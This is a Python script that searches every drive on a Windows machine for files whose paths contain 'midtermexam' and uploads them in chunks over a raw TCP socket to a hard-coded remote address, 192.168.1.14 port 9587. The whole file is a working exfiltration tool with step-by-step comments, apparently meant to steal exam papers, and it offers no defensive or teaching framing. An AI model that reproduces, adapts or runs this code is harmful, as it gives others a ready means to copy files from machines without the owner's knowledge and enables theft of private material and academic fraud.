# -*- coding: utf-8 -*-
import os
import re
import socket
import hashlib
import time

# Get a list of all logical drives on the Windows machine
drives = os.popen('wmic logicaldisk get caption')
# Strip the output to remove leading/trailing white spaces
drives = [drive.strip() for drive in drives if drive.strip()]

# Initialize an empty list to hold the full path of each file named "midtermexam"
exam_file_list = []
# Iterate through each logical drive
for drive in drives:
    # Join the drive letter with a double backslash separator to form a valid path
    path = os.path.join(drive, "\\\\")

    # Recursively traverse all subdirectories under the path
    for dirPath, dirNames, fileNames in os.walk(path):

        # Find files that match the regular expression pattern "midtermexam"
        for file in fileNames:
            if re.search("midtermexam", os.path.join(dirPath, file)) and not file.endswith('.lnk'):

                # Add the full path of the matching file to the exam_file_list
                exam_file_list.append(os.path.join(dirPath, file))

# Remove any UNC path prefix from each element of the exam_file_list
exam_file_list = [elem for elem in exam_file_list if not elem.startswith('\\\\')]
# Print the updated exam_file_list to the console
print(f'exam_file_list', exam_file_list)

# Create a new client socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to a remote server with IP address "192.168.1.14" and port number 9587
client_socket.connect(("192.168.1.14", 9587))

# Initialize an empty dictionary to keep track of each file's MD5 hash value that has been sent to the server
hash_dict = {}
# Iterate through each file in the exam_file_list
for exam_file in exam_file_list:

    # Open the file in binary mode
    with open(exam_file, "rb") as f:

        # Compute the MD5 hash of the file's contents
        md5 = hashlib.md5(f.read()).hexdigest()

    # Print the filename and its MD5 hash value to the console
    print(f"{exam_file} md5: {md5}")
    # If the MD5 hash value of the file has already been sent, skip the file and move on to the next file
    if md5 in hash_dict:
        print(f"{exam_file} has already been sent")
        continue

    # Get the file size
    file_size = os.path.getsize(exam_file)
    # Send the filename and file size to the server over the client socket
    client_socket.sendall(f"{os.path.basename(exam_file)}\\n{file_size}".encode())
    print(f"{os.path.basename(exam_file)}\\n{file_size}".encode())

    # Read the file contents in chunks of 1MB (1048576 bytes) and send them to the server over the client socket
    with open(exam_file, "rb") as f:
        while True:
            data = f.read(1048576)
            if not data:
                break
            client_socket.sendall(data)
            print(f"sending {len(data)} bytes...")
            time.sleep(2)
    # Add the MD5 hash value of the file to the hash_dict
    hash_dict[md5] = exam_file

# Send the "over" string to the server to indicate that all files have been sent
client_socket.sendall(b"over")
# Close the client socket
client_socket.close()
print("connection closed")
